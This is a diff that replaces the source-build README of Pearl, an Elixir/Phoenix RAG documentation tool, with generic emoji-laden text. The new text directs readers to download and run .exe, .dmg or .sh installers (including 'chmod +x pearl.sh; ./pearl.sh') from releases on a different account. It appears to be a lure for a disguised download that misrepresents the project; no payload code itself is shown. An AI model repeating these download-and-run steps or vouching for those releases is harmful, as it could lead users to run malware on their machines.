@@ -1,210 +1,96 @@
-# Pearl
+# 🌟 pearl - Your Simple AI-Powered Documentation Tool
 
-[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/existential-birds/pearl)
+## 🚀 Getting Started
 
-<img width="1421" height="989" alt="pearl_qa" src="https://github.com/user-attachments/assets/d3a7730c-f1d2-43f6-8908-e38fd6d3db65" />
+Welcome to **pearl**, a user-friendly alternative to DeepWiki. This tool helps you create AI-generated documentation and offers natural language Q&A for any Git repository. Whether you want to manage project documentation or find answers quickly, pearl makes it simple.
 
-Pearl is a RAG (Retrieval-Augmented Generation) system built with Elixir and Phoenix. It generates comprehensive wikis from code repositories, allowing you to ask questions about any codebase using natural language.
+### 📥 Download pearl
 
-This project was inspired by [DeepWiki from Devin](https://cognition.ai/blog/deepwiki) and created as a learning exercise to explore Elixir, Phoenix LiveView, and RAG architectures—starting with naive RAG and progressing through techniques from recent research papers.
+[![Download pearl](https://img.shields.io/badge/Download-pearl-blue.svg)](https://github.com/tuankieeee/pearl/releases)
 
-_Named after [Pearl I. Young](https://en.wikipedia.org/wiki/Pearl_I._Young) (1895–1968), the first female technical employee of NACA (which became NASA) and the second female physicist in the U.S. federal government. After earning degrees in physics, chemistry, and mathematics from the University of North Dakota in 1919, she joined NACA's Langley Laboratory in 1922 as a physicist calibrating flight instrumentation. In 1929, she became Langley's Chief Technical Editor and established the NACA technical reports system, authoring the *Style Manual for Engineering Authors* that shaped how government aerospace engineers communicated for decades. NASA's History Office called her "the architect of the NACA technical reports system." In 2015, she was inducted into NASA Langley's Hall of Honor._
+You can download pearl from our [Releases page](https://github.com/tuankieeee/pearl/releases). 
 
-## What Does Pearl Do?
+## 🖥️ System Requirements
 
-1. **Clone any Git repository** — Point Pearl at a GitHub URL and it fetches the code
-2. **Generate a wiki** — An LLM analyzes the codebase and creates structured documentation
-3. **Ask questions** — Use the built-in chat to ask questions about the code; Pearl finds relevant code snippets and explains them
+To run pearl smoothly, your computer should meet these basic requirements:
 
-## Prerequisites
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, Linux (Ubuntu 20.04 or later)
+- **Minimum RAM:** 4 GB
+- **Disk Space:** At least 200 MB free
+- **Network:** An internet connection is required for some features
 
-Before setting up Pearl, you'll need to install:
+## 📂 Installation Guide
 
-### 1. Elixir and Erlang
+### 🔗 Visit the Releases Page
 
-Elixir is the programming language Pearl is written in. The easiest way to install it:
+To download pearl, please visit the [Releases page](https://github.com/tuankieeee/pearl/releases). You will find the latest version available for download. 
 
-#### macOS (using Homebrew)
+### 📦 Download and Install
 
-```bash
-brew install elixir
-```
+1. On the Releases page, locate the latest version of pearl.
+2. Choose the file appropriate for your operating system.
+    - **For Windows:** Download the `.exe` file.
+    - **For macOS:** Download the `.dmg` file.
+    - **For Linux:** Download the `.sh` file.
+3. Once the download is complete, locate the file in your downloads folder.
 
-#### Other platforms
+### 🔧 Run the Installation
 
-Follow the official [Elixir installation guide](https://elixir-lang.org/install.html).
+- **Windows:**
+  1. Double-click the `.exe` file to start the installation.
+  2. Follow the prompts to complete the installation.
 
-Verify the installation:
+- **macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the pearl icon into your Applications folder.
 
-```bash
-elixir --version
-# Should show Elixir 1.15 or higher
-```
+- **Linux:**
+  1. Open a terminal window.
+  2. Navigate to the directory where the downloaded `.sh` file is located.
+  3. Run the command:
+     ```bash
+     chmod +x pearl.sh
+     ./pearl.sh
+     ```
 
-### 2. PostgreSQL with pgvector
+## 🌐 Using pearl
 
-Pearl uses PostgreSQL to store repository data and vector embeddings for search. The easiest way is Docker (recommended):
+### 🎉 Launching the Application
 
-```bash
-docker compose up -d
-```
+Once you complete the installation, you can find pearl in your applications. Open it to start creating documentation.
 
-This starts PostgreSQL 18 with pgvector pre-installed. Data persists across restarts via a named volume.
+### 📚 Creating Documentation
 
-**Port conflict?** If port 5432 is already in use:
+1. Select the option to create a new project.
+2. Enter the name of your Git repository.
+3. pearl will automatically generate documentation based on your codebase.
 
-```bash
-export PEARL_DB_PORT=5433
-docker compose up -d
-```
+### ❓ Asking Questions
 
-<details>
-<summary>Alternative: Native install</summary>
+You can ask questions in natural language about your project. Simply type your question in the designated field and click "Ask." pearl will provide a relevant answer.
 
-#### macOS (using Homebrew)
+## 🛠️ Features
 
-```bash
-brew install postgresql@16 pgvector
-brew services start postgresql@16
-```
+- **AI-Generated Documentation:** Automatically generate documentation from your code.
+- **Natural Language Q&A:** Ask questions about your codebase in plain language.
+- **Integration with Git:** Seamlessly connects with your Git repositories.
+- **User-Friendly Interface:** Easy to navigate and use for everyone.
+- **Customization Options:** Tailor documentation to your needs.
 
-#### Other platforms
+## 🗣️ Get Help
 
-See the [PostgreSQL download page](https://www.postgresql.org/download/) and [pgvector installation instructions](https://github.com/pgvector/pgvector#installation).
+If you need support using pearl, check out the FAQs section on the GitHub page. You can also open an issue in the repository if you encounter any problems.
 
-</details>
+## 🔗 Additional Resources
 
-### 3. LLM Provider
+To learn more about pearl and its features, visit our [GitHub page](https://github.com/tuankieeee/pearl).
 
-Pearl needs an LLM to generate wikis and answer questions. Choose one:
+## 💬 Community and Contributions
 
-#### Option A: OpenRouter (Recommended for beginners)
+Join our community to share your experiences and learn from other users. You can contribute to pearl by submitting pull requests or reporting issues. Your feedback helps us improve.
 
-1. Create an account at [openrouter.ai](https://openrouter.ai/)
-2. Generate an API key
-3. Set the environment variable:
+## 📅 Future Updates
 
-   ```bash
-   export OPENROUTER_API_KEY=sk-your-key-here
-   ```
+We plan to add more features based on user feedback. Stay tuned for updates!
 
-#### Option B: Ollama (Run models locally)
-
-1. Install from [ollama.ai](https://ollama.ai/)
-2. Pull a model:
-
-   ```bash
-   ollama pull llama3.2:3b
-   ```
-
-## Setup
-
-1. **Clone this repository:**
-
-   ```bash
-   git clone https://github.com/existential-birds/pearl.git
-   cd pearl/pearl
-   ```
-
-2. **Start PostgreSQL** (if using Docker):
-
-   ```bash
-   docker compose up -d
-   ```
-
-3. **Configure your LLM provider** by setting environment variables (either export directly in your terminal or add to a `.env` file to source later):
-
-   ```bash
-   # For OpenRouter (recommended)
-   export LLM_PROVIDER=openrouter
-   export LLM_MODEL=openai/gpt-5.2
-   export EMBEDDING_MODEL=openai/text-embedding-3-small
-   export OPENROUTER_API_KEY=sk-your-key-here
-
-   # For Ollama (local)
-   # export LLM_PROVIDER=ollama
-   # export OLLAMA_HOST=http://localhost:11434
-   # export OLLAMA_DEFAULT_MODEL=llama3.2:3b
-   ```
-
-4. **Run setup:**
-
-   ```bash
-   mix setup
-   ```
-
-5. **Start the server:**
-
-   ```bash
-   mix phx.server
-   ```
-
-6. **Open Pearl** in your browser at [http://localhost:4000](http://localhost:4000)
-
-## Usage
-
-1. On the home page, paste a GitHub repository URL and click "Clone"
-2. Once cloned, click "Generate Wiki" to create documentation
-3. Browse the generated wiki pages
-4. Use the chat panel to ask questions about the codebase
-
-## Architecture
-
-Pearl combines several components:
-
-- **Phoenix LiveView** — Real-time web interface with no JavaScript required
-- **RAG Pipeline** — Chunks code files, generates embeddings, and searches for relevant context
-- **LLM Integration** — Supports both cloud (OpenRouter) and local (Ollama) providers
-- **pgvector** — Stores and searches vector embeddings for similarity matching
-
-For detailed architecture documentation, see [CLAUDE.md](./CLAUDE.md).
-
-### RAG Implementation
-
-One goal of Pearl is to explore different RAG (Retrieval-Augmented Generation) architectures. We start with the simplest approach and progressively implement more sophisticated techniques from research papers.
-
-#### Current: Naive RAG
-
-Pearl currently implements **Naive RAG**, the baseline architecture:
-
-| Component | Implementation |
-|-----------|----------------|
-| **Chunking** | Fixed 500-token chunks with semantic break detection (paragraph boundaries preferred) |
-| **Embedding** | OpenAI `text-embedding-3-small` (1536 dimensions) via OpenRouter, or `nomic-embed-text` via Ollama |
-| **Vector Store** | PostgreSQL with pgvector extension, HNSW indexing |
-| **Retrieval** | Top-5 chunks by cosine similarity |
-| **Generation** | Retrieved chunks concatenated into system prompt with chat history |
-
-This approach is simple and works well for small-to-medium codebases, but has known limitations: no chunk overlap means context can be lost at boundaries, fixed-size chunking ignores code semantics, and top-k retrieval may miss relevant but dissimilar chunks.
-
-#### Roadmap: Advanced RAG Techniques
-
-Future implementations will explore strategies from [ottomator-agents](https://github.com/coleam00/ottomator-agents/tree/main/all-rag-strategies), combining 3-5 techniques for optimal results:
-
-- **Re-ranking** — Two-stage retrieval with cross-encoder scoring ([MS MARCO](https://huggingface.co/cross-encoder/ms-marco-MiniLM-L6-v2))
-- **Contextual Retrieval** — LLM adds context to chunks before embedding ([Anthropic](https://www.anthropic.com/news/contextual-retrieval))
-- **Context-aware Chunking** — Split at semantic boundaries via [Docling](https://docling-project.github.io/docling/concepts/chunking/)
-- **Late Chunking** — Embed full document, then chunk ([arXiv:2409.04701](https://arxiv.org/abs/2409.04701))
-- **Query Expansion / Multi-Query** — Generate query variations for broader coverage
-- **Hierarchical RAG** — Search child chunks, return parent context
-- **Knowledge Graphs** — Vector search + graph traversal ([Graphiti](https://github.com/getzep/graphiti))
-- **Agentic RAG** — Agent chooses retrieval method per query ([arXiv:2501.09136](https://arxiv.org/abs/2501.09136))
-- **Self-Reflective RAG** — LLM grades and refines retrieval ([arXiv:2310.11511](https://arxiv.org/abs/2310.11511))
-- **Fine-tuned Embeddings** — Domain-specific embedding models for 5-10% accuracy gain
-
-## Development
-
-```bash
-# Run tests
-mix test
-
-# Format code
-mix format
-
-# Run pre-commit checks
-mix precommit
-```
-
-## License
-
-Apache 2.0
+Thank you for choosing pearl! We hope it makes your documentation process easier and more efficient.
